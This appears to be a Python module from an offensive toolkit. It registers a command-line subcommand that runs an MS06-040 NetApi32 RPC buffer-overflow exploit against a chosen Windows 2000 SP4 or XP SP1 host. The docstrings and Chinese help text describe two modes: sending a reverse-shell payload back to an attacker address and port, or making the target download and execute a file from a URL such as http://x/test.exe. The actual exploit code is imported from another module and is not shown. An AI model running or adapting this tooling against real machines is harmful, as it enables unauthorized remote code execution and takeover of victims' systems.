"""netapi32-exp — MS06-040 (NetApi32 NetpwPathCanonicalize) RPC exploit.

Python rewrite of the Mika MS06-040 RPC exploit recovered from
`ms06040rpc.exe` (memory-packed; unpacked OEP 0x401000) via IDA Pro.  It binds
the remote Browser RPC interface over the `\\<host>\\pipe\\BROWSER` named pipe
and fires a NetpwPathCanonicalize overflow request (opnum 0x1F) carrying a
reverse-shell or URL-download shellcode for Windows 2000 SP4 / XP SP1.
"""

from . import netapi32_exp


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def netapi32_exp_handle(args):
    """Run the MS06-040 exploit against the supplied host."""
    return netapi32_exp.run_function(
        host=args.host,
        mode="reverse" if args.rport is not None else "download",
        url=args.url,
        raddr=args.raddr,
        rport=args.rport,
        os_type=args.ostype,
    )


def reg_subparser(subparsers):
    """Register the `netapi32-exp` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "netapi32-exp",
        help="MS06-040 (NetApi32 NetpwPathCanonicalize) RPC 利用",
        description="通过远程 \\\\<host>\\pipe\\BROWSER 命名管道绑定 Browser RPC 接口，"
                    "发送 NetpwPathCanonicalize 溢出请求 (opnum 0x1F)，携带反弹 shell "
                    "(reverse) 或 URL 下载执行 (download) 的 shellcode，针对 "
                    "Win2000 SP4 / WinXP SP1。",
    )
    p.add_argument(
        "host", metavar="HOST",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-u", "--url", metavar="URL",
        help="download 模式：让目标去下载并执行的 URL，如 http://x/test.exe",
    )
    p.add_argument(
        "-r", "--raddr", metavar="ADDR",
        help="reverse 模式：反弹连接的目标（本机）IP",
    )
    p.add_argument(
        "-p", "--rport", type=int, metavar="PORT",
        help="reverse 模式：反弹连接的监听端口",
    )
    p.add_argument(
        "-o", "--ostype", type=int, default=1,
        help="目标系统：1=Win2000 SP4（默认），2=WinXP SP1",
    )
    p.set_defaults(func=netapi32_exp_handle)